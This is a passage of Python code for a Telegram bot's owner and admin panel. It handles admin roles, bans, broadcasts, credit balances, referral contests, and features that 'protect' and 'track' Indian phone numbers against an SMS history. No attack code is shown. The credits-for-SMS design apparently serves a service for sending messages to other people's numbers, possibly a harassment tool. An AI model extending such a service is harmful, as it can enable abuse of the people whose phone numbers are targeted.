    if len(full) > 4000: full = full[:3990] + "..."
    try:
        await cq.message.edit_text(full, reply_markup=kb([(f"{sc('refresh')}", "owner:stats"), (f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("⏳")
    devices = get_cached_devices() or await get_all_online_devices(d)
    full = api_stats_text(d) + f"\n\n🟢 Online: <b>{len(devices)}</b>"
    try:
        await cq.message.edit_text(full, reply_markup=kb([(f"{sc('refresh')}", "admin:stats"), (f"{sc('back')}", "admin:home")]), parse_mode="HTML")
    except: pass


# ================= OWNERS MENU =================
@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    try:
        await cq.message.edit_text(
            f"👑 <b>Super Admins</b>\n\nTotal: <b>{len(d.get('owners', []))}/6</b>",
            reply_markup=owners_menu_kb(d), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("❌ Max 6!", show_alert=True); return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(f"👑 <b>Add Owner</b>\n\nChat ID:", reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]), parse_mode="HTML")


@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        nid = int(msg.text.strip())
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    if is_owner(nid, d):
        await state.clear()
        await msg.answer(f"⚠️ Already!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
        return
    d["owners"].append(nid)
    save(d)
    await state.clear()
    await msg.answer(f"✅ Added <code>{nid}</code>", reply_markup=owners_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(nid, f"🔱 You're now Super Admin!", parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    did = int(cq.data.split(":")[-1])
    if not is_owner(uid, d):
        await cq.answer("🚫", show_alert=True); return
    if did == MAIN_OWNER or did in SUPER_ADMINS:
        await cq.answer("❌ Cannot remove main!", show_alert=True); return
    if did in d["owners"]:
        d["owners"].remove(did)
        save(d)
        await cq.answer("🗑 Removed!", show_alert=True)
    await owner_owners_menu(cq, state)


# ================= ADMINS MENU =================
@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    try:
        await cq.message.edit_text(
            f"🛡 <b>Admins</b>\n\nTotal: <b>{len(d.get('admins', []))}</b>",
            reply_markup=admins_menu_kb(d), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(f"🛡 <b>Add Admin</b>\n\nUser ID:", reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]), parse_mode="HTML")


@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        nid = int(msg.text.strip())
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    if nid in d.get("admins", []) or is_owner(nid, d):
        await state.clear()
        await msg.answer(f"⚠️ Already!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
        return
    d["admins"].append(nid)
    save(d)
    await state.clear()
    await msg.answer(f"✅ Added <code>{nid}</code>", reply_markup=admins_menu_kb(load()), parse_mode="HTML")
    try:
        await msg.bot.send_message(nid, f"🛡 You're now Admin!", parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    did = int(cq.data.split(":")[-1])
    if did in d.get("admins", []):
        d["admins"].remove(did)
        save(d)
        await cq.answer("🗑", show_alert=True)
    await owner_admins_menu(cq, state)


# ================= FREE MODE =================
@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    await cq.answer("Done!", show_alert=True)
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except: pass


# ================= USERS LIST =================
@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    prefix = "owner" if is_owner(uid, d) else "admin"
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    text, markup = users_list_kb(d, prefix, 0)
    try:
        await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
    except: pass


@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    prefix = cq.data.split(":")[0]
    page = int(cq.data.split(":")[-1])
    text, markup = users_list_kb(d, prefix, page)
    try:
        await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
    except: pass


# ================= BAN / UNBAN =================
@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(f"🚫 <b>Ban User</b>\n\nID bhejo:", reply_markup=kb([(f"{sc('cancel')}", back)]), parse_mode="HTML")


@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear(); return
    try:
        ban_id = int(msg.text.strip())
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    if is_owner(ban_id, d) or is_admin(ban_id, d):
        await state.clear()
        await msg.answer(f"❌ Cannot ban admin!", parse_mode="HTML"); return
    if ban_id not in d.get("banned", []):
        d.setdefault("banned", []).append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"🚫 <code>{ban_id}</code> banned!", reply_markup=back_kb, parse_mode="HTML")
    try:
        await msg.bot.send_message(ban_id, f"🚫 Aapko ban kar diya gaya.", parse_mode="HTML")
    except: pass


@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ No banned!", show_alert=True); return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    try:
        await cq.message.edit_text(
            f"🔓 <b>Unban</b>\n\nTotal: <b>{len(banned)}</b>",
            reply_markup=unban_menu_kb(d, prefix), parse_mode="HTML")
    except: pass


@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫", show_alert=True); return
    bid = int(cq.data.split(":")[-1])
    if bid in d.get("banned", []):
        d["banned"].remove(bid)
        save(d)
    await cq.answer(f"✅ Unbanned!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    try:
        await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
    except: pass
    try:
        await cq.bot.send_message(bid, f"✅ Ban hata diya gaya!", parse_mode="HTML")
    except: pass


# ================= BROADCAST =================
@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(f"📢 <b>Broadcast</b>\n\nMessage bhejo:", reply_markup=kb([(f"{sc('cancel')}", back)]), parse_mode="HTML")


@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear(); return
    await state.clear()
    users = d.get("users", {})
    eligible = []
    for uid_str, u in users.items():
        prefs = u.get("notif_prefs", {})
        if prefs.get("broadcast", True):
            eligible.append(uid_str)
    wait = await msg.answer(f"📤 Sending to {len(eligible)} users...", parse_mode="HTML")
    ok = fail = 0
    for uid_str in eligible:
        try:
            if msg.text:
                await msg.bot.send_message(int(uid_str), f"📢 <b>Broadcast</b>\n\n{msg.text}", parse_mode="HTML")
            else:
                await msg.copy_to(int(uid_str))
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    try:
        await wait.delete()
    except: pass
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"✅ Sent: {ok} | Failed: {fail}", reply_markup=back_kb, parse_mode="HTML")


# ================= EXPORT SCRIPT =================
@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("📤")
    try:
        sp = os.path.abspath(__file__)
        if not os.path.exists(sp): sp = "bot.py"
        await cq.message.reply_document(document=FSInputFile(sp), caption=f"📤 Export — {_VERSION}")
    except Exception as e:
        await cq.answer(f"❌ {str(e)[:40]}", show_alert=True)


# ================= PROTECT NUMBER =================
@R.callback_query(F.data == "owner:protect")
async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.protect_number)
    await cq.message.edit_text(f"🔒 <b>Protect Number</b>\n\nNumber bhejo:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")


@R.message(S.protect_number)
async def owner_protect_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    num = extract_indian_number(msg.text.strip())
    if not num:
        await msg.answer(f"❌ Invalid number.", parse_mode="HTML"); return
    PROTECTED_NUMBERS[num] = msg.from_user.id
    d["protected_numbers"] = PROTECTED_NUMBERS
    save(d)
    await state.clear()
    await msg.answer(f"✅ Protected <code>{num}</code>", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    prot = d.get("protected_numbers", {})
    if not prot:
        try:
            await cq.message.edit_text(f"🔐 <b>Protected</b>\n\n❌ None.", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        except: pass
        return
    lines = [f"🔐 <b>Protected Numbers</b>\n"]
    rows = []
    for num, puid in prot.items():
        lines.append(f"📞 <code>{num}</code>")
        rows.append([btn(f"🗑 {num}", f"owner:protected_del:{num}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    try:
        await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    num = cq.data.split(":")[-1]
    if num in d.get("protected_numbers", {}):
        del d["protected_numbers"][num]
        save(d)
        global PROTECTED_NUMBERS
        PROTECTED_NUMBERS = d["protected_numbers"]
        await cq.answer("✅ Removed!", show_alert=True)
    await owner_protected_list(cq, state)


# ================= TRACK NUMBER =================
@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.track_number)
    await cq.message.edit_text(f"📊 <b>Track Number</b>\n\nNumber bhejo:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")


@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    num = msg.text.strip()
    await state.clear()
    users = []
    for uid_str, hlist in d.get("sms_history", {}).items():
        for e in hlist:
            if e.get("number") == num:
                users.append(int(uid_str)); break
    if not users:
        await msg.answer(f"❌ No history for {num}", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return
    lines = [f"📊 <b>Tracking {num}</b>\n"]
    for u in users[:20]:
        nm = get_display_name(u, d)
        lines.append(f"• <code>{u}</code> — {nm[:20]}")
    await msg.answer("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")


# ================= ADD / DEDUCT ALL CREDITS =================
@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_all_credits_amount)
    await cq.message.edit_text(f"💰 <b>Add to ALL Users</b>\n\nAmount?", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")


@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amt = int(msg.text.strip())
        if amt <= 0: raise ValueError
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    await state.clear()
    users = d.get("users", {})
    count = 0
    for uid_str in users:
        add_credits(int(uid_str), amt, d)
        count += 1
    save(d)
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), f"💰 +{amt} credits!", parse_mode="HTML")
            await asyncio.sleep(0.05)
        except: pass
    await msg.answer(f"✅ +{amt} to {count} users!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.deduct_all_credits_amount)
    await cq.message.edit_text(f"💰 <b>Deduct from ALL</b>\n\nAmount?", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")


@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amt = int(msg.text.strip())
        if amt <= 0: raise ValueError
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    await state.clear()
    owners = d.get("owners", [MAIN_OWNER])
    admins = d.get("admins", [])
    count = 0; tot = 0
    for uid_str, u in d.get("users", {}).items():
        if int(uid_str) in owners or int(uid_str) in admins: continue
        cur = u.get("credits", 0)
        if cur >= amt:
            u["credits"] = cur - amt; count += 1; tot += amt
        elif cur > 0:
            u["credits"] = 0; count += 1; tot += cur
    save(d)
    await msg.answer(f"✅ Deducted {tot} from {count} users.", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")


# ================= ADD / DEDUCT SINGLE CREDITS =================
@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(f"💰 <b>Add Credits</b>\n\nUser ID bhejo:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")


@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"❌ ID bhejo.", parse_mode="HTML"); return
    await state.set_state(S.add_credits_amount)
    await msg.answer(f"💰 Kitne credits add?", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")


@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amt = int(msg.text.strip())
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amt, d)
    k = str(uid)
    if k in d["users"]:
        d["users"][k]["credits_bought"] = d["users"][k].get("credits_bought", 0) + amt
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(uid, f"💰 +{amt} credits!", parse_mode="HTML")
    except: pass
    await msg.answer(f"✅ +{amt} to <code>{uid}</code>. New: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    d_ach = load()
    new_badges = check_and_unlock_achievements(msg.bot, uid, d_ach)
    save(d_ach)


@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(f"💰 <b>Deduct</b>\n\nUser ID:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")


@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(f"💰 Kitne deduct?", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")


@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        amt = int(msg.text.strip())
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    ok = deduct_credits(uid, amt, d)
    save(d)
    await state.clear()
    if ok:
        await msg.answer(f"✅ -{amt} from <code>{uid}</code>. New: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    else:
        await msg.answer(f"❌ Insufficient!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")


# ================= SETTINGS =================
@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    s = d.get("settings", {})
    try:
        await cq.message.edit_text(
            f"⚙️ <b>Settings</b>\n\n🎁 Ref Credits: <b>{s.get('ref_credits', 3)}</b>\n👑 Max Owners: <b>{s.get('max_owners', 6)}</b>",
            reply_markup=kb([(f"🎁 {sc('set ref credits')}", "owner:settings:ref"), (f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(f"🎁 Ref credits?", reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]), parse_mode="HTML")


@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        c = int(msg.text.strip())
        if c < 0: raise ValueError
    except:
        await msg.answer(f"❌", parse_mode="HTML"); return
    d.setdefault("settings", {})["ref_credits"] = c
    d["premium"]["ref_credits"] = c
    save(d)
    await state.clear()
    await msg.answer(f"✅ Ref credits = {c}", reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")


# ================= ACTIVITY LOG =================
@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    entries = d.get("activity_log", [])[-20:]
    if not entries:
        text = f"📜 <b>Activity</b>\n\nNo activity."
    else:
        lines = [f"📜 <b>Activity Log</b>\n"]
        for e in reversed(entries):
            ts = fmt_time(e.get("timestamp", 0))
            lines.append(f"[{ts}] <code>{e.get('uid', 0)}</code> — {e.get('action', '?')}")
        text = "\n".join(lines)
    try:
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('refresh')}", "owner:activity"), (f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    except: pass


# ================= SMS HISTORY =================
@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    total = sum(len(v) for v in d.get("sms_history", {}).values())
    try:
        await cq.message.edit_text(f"📋 <b>Global SMS History</b>\n\nTotal: <b>{total}</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    except: pass


# ================= NOTIF PREFS STATS =================
@R.callback_query(F.data == "owner:notif_prefs")
async def owner_notif_prefs_info(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    users = d.get("users", {})
    counts = {"credits_low": 0, "validity_expiring": 0, "new_feature": 0,
              "broadcast": 0, "marketing": 0}
    total = len(users)
    for u in users.values():
        prefs = u.get("notif_prefs", {})
        for key in counts:
            default = key != "marketing"
            if prefs.get(key, default):
                counts[key] += 1
    text = (f"🔔 <b>NOTIFICATION STATS</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Total Users: <b>{total}</b>\n\n"
            f"💰 Credits Low: <b>{counts['credits_low']}</b>\n"
            f"🎫 Validity Exp: <b>{counts['validity_expiring']}</b>\n"
            f"🆕 New Features: <b>{counts['new_feature']}</b>\n"
            f"📢 Broadcast: <b>{counts['broadcast']}</b>\n"
            f"📣 Marketing: <b>{counts['marketing']}</b>")
    try:
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    except: pass


# ================= CONTEST (OWNER) =================
@R.callback_query(F.data == "owner:contest")
async def owner_contest_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    c = d.get("referral_contest", {})
    status = "🟢 ON" if c.get("enabled") else "🔴 OFF"
    prizes = c.get("prizes", [100, 50, 25])
    last_dist = c.get("last_distributed", "Never")
    text = (f"🏆 <b>REFERRAL CONTEST</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Status: {status}\n\n"
            f"🥇 1st: <b>{prizes[0]} credits</b>\n"
            f"🥈 2nd: <b>{prizes[1]} credits</b>\n"
            f"🥉 3rd: <b>{prizes[2]} credits</b>\n\n"
            f"📅 Last Distributed: <b>{last_dist if last_dist else 'Never'}</b>\n"
            f"📅 Current Month: <b>{ist_month_str()}</b>")
    rows = [
        [InlineKeyboardButton(text=("🔴 Disable" if c.get("enabled") else "🟢 Enable"), callback_data="owner:contest:toggle")],
        [btn("💰 sᴇᴛ ᴘʀɪᴢᴇs", "owner:contest:prizes", EMOJI_MONEY, "💰")],
        [btn("🏆 ᴠɪᴇᴡ sᴛᴀɴᴅɪɴɢs", "owner:contest:standings", EMOJI_CROWN, "🏆")],
        [btn("🎁 ᴅɪsᴛʀɪʙᴜᴛᴇ ɴᴏᴡ", "owner:contest:distribute", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:contest:toggle")
async def owner_contest_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    c = d.setdefault("referral_contest", {"enabled": False, "prizes": [100, 50, 25], "last_distributed": ""})
    c["enabled"] = not c.get("enabled", False)
    save(d)
    status = "ENABLED" if c["enabled"] else "DISABLED"
    await cq.answer(f"✅ Contest {status}!", show_alert=True)
    await owner_contest_menu(cq, state)


@R.callback_query(F.data == "owner:contest:prizes")
async def owner_contest_prizes_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.contest_prizes_set)
    await cq.message.edit_text(
        f"💰 <b>Set Contest Prizes</b>\n\n3 prizes comma se separated bhejo:\n\n"
        f"<b>Format:</b> <code>1st,2nd,3rd</code>\n<i>Example:</i> <code>100,50,25</code>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:contest")]), parse_mode="HTML")


@R.message(S.contest_prizes_set)
async def owner_contest_prizes_set(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    text = msg.text.strip()
    try:
        parts = text.split(",")
        if len(parts) != 3: raise ValueError
        prizes = [int(p.strip()) for p in parts]
        if any(p < 0 for p in prizes): raise ValueError
    except:
        await msg.answer("❌ Format: `100,50,25`", parse_mode="Markdown"); return
    d.setdefault("referral_contest", {})["prizes"] = prizes
    save(d)
    await state.clear()
    await msg.answer(f"✅ Prizes: 🥇 {prizes[0]} | 🥈 {prizes[1]} | 🥉 {prizes[2]}",
        reply_markup=kb([(f"{sc('back')}", "owner:contest")]), parse_mode="HTML")


@R.callback_query(F.data == "owner:contest:standings")
async def owner_contest_standings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    lb = get_referral_leaderboard(d, 10)
    if not lb or all(x[2] == 0 for x in lb):
        await cq.answer("❌ Koi referrals nahi!", show_alert=True); return
    lines = [f"🏆 <b>CONTEST STANDINGS</b>\n📅 {ist_month_str()}\n", "━━━━━━━━━━━━━━━━━━"]
    medals = ["🥇", "🥈", "🥉"]
    for i, (uid, name, refs) in enumerate(lb, 1):
        if refs == 0: continue
        medal = medals[i-1] if i <= 3 else f"{i}."
        lines.append(f"{medal} {name[:18]} — {refs} ʀᴇғs")
    rows = [[btn("ʀᴇғʀᴇsʜ", "owner:contest:standings", EMOJI_GEAR, "🔄")], [btn("ʙᴀᴄᴋ", "owner:contest", EMOJI_GEAR, "🔙")]]
    try:
        await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:contest:distribute")
async def owner_contest_distribute(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
    await cq.answer("🎁 Distributing...", show_alert=True)
    await distribute_referral_contest(cq.bot)
    try:
        await cq.message.edit_text(f"✅ <b>Contest Distributed!</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:contest")]), parse_mode="HTML")
    except: pass


# ================= TOURNAMENT SETTINGS =================
@R.callback_query(F.data == "owner:tournament:settings")
async def owner_tournament_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    t = d.setdefault("tournaments", {})
    status = "🟢 ON" if t.get("enabled") else "🔴 OFF"
    prizes = t.get("prizes", [500, 250, 100])
    text = (f"🏆 <b>TOURNAMENT SETTINGS</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Status: {status}\n\n"
            f"🥇 1st: <b>{prizes[0]} credits</b>\n"
            f"🥈 2nd: <b>{prizes[1]} credits</b>\n"
            f"🥉 3rd: <b>{prizes[2]} credits</b>\n\n"
            f"<i>Har Monday reset</i>")
    rows = [
        [InlineKeyboardButton(text=("🔴 Disable" if t.get("enabled") else "🟢 Enable"), callback_data="owner:tournament:toggle")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    try:
        await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except: pass


@R.callback_query(F.data == "owner:tournament:toggle")
